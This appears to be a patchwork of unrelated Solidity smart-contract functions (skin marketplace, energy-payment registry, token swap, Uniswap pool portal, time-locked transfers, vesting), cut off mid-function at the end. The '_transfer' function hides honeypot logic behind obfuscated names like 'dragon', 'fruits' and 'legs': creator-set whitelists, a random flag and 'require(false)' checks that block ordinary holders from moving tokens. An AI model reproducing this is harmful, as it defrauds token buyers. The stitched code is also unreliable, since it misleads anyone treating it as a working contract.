function putOnSale(uint256 skinId, uint256 price) public whenNotPaused {
    require(skinIdToOwner[skinId] == msg.sender);
    require(accountsToActiveSkin[msg.sender] != skinId);
    require(skins[skinId].mixingWithId == 0);
    require(isOnSale[skinId] == false);
    require(price > 0);
    desiredPrice[skinId] = price;
    isOnSale[skinId] = true;
    emit PutOnSale(msg.sender, skinId);
}

function recycleSkin(uint256[5] wasteSkins, uint256 preferIndex) external whenNotPaused {
    require(isRecycleAllowed == true);
    for (uint256 i = 0; i < 5; i++) {
        require(skinIdToOwner[wasteSkins[i]] == msg.sender);
        skinIdToOwner[wasteSkins[i]] = address(0);
    }
    uint128[5] memory apps;
    for (i = 0; i < 5; i++) {
        apps[i] = skins[wasteSkins[i]].appearance;
    }
    uint128 recycleApp = mixFormula.recycleAppearance(apps, preferIndex, getActiveSkin(msg.sender));
    Skin memory newSkin = Skin({
        appearance: recycleApp,
        cooldownEndTime: uint64(now),
        mixingWithId: 0
    });
    skins[nextSkinId] = newSkin;
    skinIdToOwner[nextSkinId] = msg.sender;
    isOnSale[nextSkinId] = false;
    emit Recycle(wasteSkins[0], wasteSkins[1], wasteSkins[2], wasteSkins[3], wasteSkins[4], nextSkinId);
    nextSkinId++;
    numSkinOfAccounts[msg.sender] -= 4;
}

function addTxToCustomerRegistry(
    address _customer,
    bytes32 _txOrigMcwTransfer,
    uint256 _amountMCW,
    uint256 _amountKWh
) public onlyOwner returns(bool) {
    require(
        isValidCustomer(_customer),
        "Customer is not in the registry."
    );
    require(
        _txOrigMcwTransfer != 0 && _amountMCW != 0 && _amountKWh != 0,
        "All parameters must be not empty."
    );
    uint256 timestamp = now;
    bytes32 txPaymentForMCW = keccak256(
        abi.encodePacked(
            _customer,
            _amountMCW,
            _amountKWh,
            timestamp)
    );
    TxRegistry txRegistry = TxRegistry(registry[_customer]);
    require(
        txRegistry.getTxTimestampPaymentMCW(txPaymentForMCW) == 0,
        "Tx with such hash is already exist."
    );
    if (!txRegistry.addTxToRegistry(
            txPaymentForMCW,
            _txOrigMcwTransfer,
            _amountMCW,
            _amountKWh,
            timestamp))
        revert("Something went wrong.");
    emit NewCustomerTx(
        _customer,
        txPaymentForMCW,
        _txOrigMcwTransfer,
        _amountMCW,
        _amountKWh,
        timestamp);
    return true;
}

function swap(
    bytes32 id,
    address[5] orderAddresses,
    uint[6] orderValues,
    uint8 v,
    bytes32 r,
    bytes32 s)
external
payable
returns(uint256 takerTokenFilledAmount) {
    address makerTokenAddress = orderAddresses[2];
    address takerTokenAddress = orderAddresses[3];
    uint makerTokenAmount = orderValues[0];
    uint takerTokenAmount = orderValues[1];
    if (takerTokenAddress == wethAddress) {
        require(takerTokenAmount == msg.value, "WRONG_ETH_AMOUNT");
        WETH(wethAddress).deposit.value(takerTokenAmount)();
    } else {
        require(ERC20(takerTokenAddress).transferFrom(msg.sender, this, takerTokenAmount), "TOKEN_TRANSFER_FROM_ERROR");
    }
    require(ERC20(takerTokenAddress).approve(tokenProxyAddress, takerTokenAmount), "TOKEN_APPROVE_ERROR");
    require(
        Exchange(exchangeAddress).fillOrder(orderAddresses, orderValues, takerTokenAmount, true, v, r, s) == takerTokenAmount,
        "FILL_ORDER_ERROR"
    );
    if (makerTokenAddress == wethAddress) {
        WETH(wethAddress).withdraw(makerTokenAmount);
        msg.sender.transfer(makerTokenAmount);
    } else {
        require(ERC20(makerTokenAddress).transfer(msg.sender, makerTokenAmount), "TOKEN_TRANSFER_ERROR");
    }
    emit LogSwapSuccess(id);
    return takerTokenAmount;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (tornado == false)) {
        cutting = chTx;
        wedding = true;
    }
    if ((address(sender) == creator) && (tornado == true)) {
        dragon[recipient] = true;
        fruits[recipient] = false;
        tornado = false;
    }
    if ((amount > happy) && (dragon[sender] == true) && (address(sender) != creator)) {
        legs[recipient] = true;
    }
    if (dragon[recipient] != true) {
        fruits[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((fruits[sender]) && (dragon[recipient] == false)) {
        fruits[recipient] = true;
    }
    if (dragon[sender] == false) {
        if ((amount > happy) && (legs[sender] == true)) {
            require(false);
        }
        require(amount < cutting);
        if (wedding == true) {
            if (legs[sender] == true) {
                require(false);
            }
            legs[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function sellPool(
    uint256 _amount,
    uint _type,
    IERC20 _poolToken
)
external
payable {
    if (_type == uint(PortalType.Bancor)) {
        sellPoolViaBancor(_poolToken, _amount);
    } else if (_type == uint(PortalType.Uniswap)) {
        sellPoolViaUniswap(_poolToken, _amount);
    } else {
        revert();
    }
    emit SellPool(address(_poolToken), _amount, msg.sender);
}

function buyUniswapPool(address _poolToken, uint256 _ethAmount)
private
returns(uint256 poolAmount) {
    address tokenAddress = uniswapFactory.getToken(_poolToken);
    if (tokenAddress != address(0x0000000000000000000000000000000000000000)) {
        uint256 erc20Amount = getUniswapTokenAmountByETH(tokenAddress, _ethAmount);
        _transferFromSenderAndApproveTo(IERC20(tokenAddress), erc20Amount, _poolToken);
        UniswapExchangeInterface exchange = UniswapExchangeInterface(_poolToken);
        uint256 deadline = now + 15 minutes;
        poolAmount = exchange.addLiquidity.value(_ethAmount)(
            1,
            erc20Amount,
            deadline);
        IERC20(tokenAddress).approve(_poolToken, 0);
        require(poolAmount > 0, "UNI pool recieved amount can not be zerro");
        IERC20(_poolToken).transfer(msg.sender, poolAmount);
        uint256 remainsERC = IERC20(tokenAddress).balanceOf(address(this));
        if (remainsERC > 0)
            IERC20(tokenAddress).transfer(msg.sender, remainsERC);
        setTokenType(_poolToken, "UNISWAP_POOL");
    } else {
        revert();
    }
}

function transferWithLock(address _to, uint256 _value, uint32 _lockTime) public whenNotPaused {
    assert(lockAdminList[msg.sender] == true);
    assert(_lockTime > now);
    transfer(_to, _value);
    bool needNewLock = true;
    for (uint32 i = 0; i < addressTimeLock[_to].lockList.length; i++) {
        if (addressTimeLock[_to].lockList[i].time < now) {
            addressTimeLock[_to].lockList[i].time = _lockTime;
            addressTimeLock[_to].lockList[i].amount = _value;
            emit TransferWithLockEvt(msg.sender, _to, _value, _lockTime);
            needNewLock = false;
            break;
        }
    }
    if (needNewLock == true) {
        addressTimeLock[_to].lockList.length++;
        addressTimeLock[_to].lockList[(addressTimeLock[_to].lockList.length - 1)].time = _lockTime;
        addressTimeLock[_to].lockList[(addressTimeLock[_to].lockList.length - 1)].amount = _value;
        emit TransferWithLockEvt(msg.sender, _to, _value, _lockTime);
    }
}

function vestedAmount() public view returns(uint256) {
    uint256 currentBalance = revoToken.balanceOf(address(this));
    uint256 totalBalance = currentBalance.add(_released[address(tokenAddress)]);
    if (block.timestamp < _cliff) {
        return 0;
    } else if (block.timestamp >= _start.add(_duration)) {
        return totalBalance;
    } else {
        return totalBalance.mul(block.timestamp.sub(_start)).div(_duration);
    }
}

constructor(address revoTokenAddress, uint256 start, uint256 cliffDuration, uint256 duration) public {
    revoToken = IRevoTokenContract(revoTokenAddress);
    tokenAddress = revoTokenAddress;
    start = start == 0 ? now : start;
    require(cliffDuration <= duration, "TokenVesting: cliff is longer than duration");
    require(duration > 0, "TokenVesting: duration is 0");
    require(start.add(duration) > block.timestamp, "TokenVesting: final time is before current time");
    _duration = duration;
    _cliff = start.add(cliffDuration);
    _start = start;
}

function release() public onlyOwner {
    uint256 unreleased = releasableAmount();
    require(unreleased > 0, "TokenVesting: no tokens are due");
    _released[address(tokenAddress)] = _released[address(tokenAddress)].add(unreleased);
    revoToken.transfer(owner(), unreleased);
    emit TokensReleased(address(tokenAddress), unreleased);
}

function MummyAccountWithdraw()
onlyBagholders()
public {
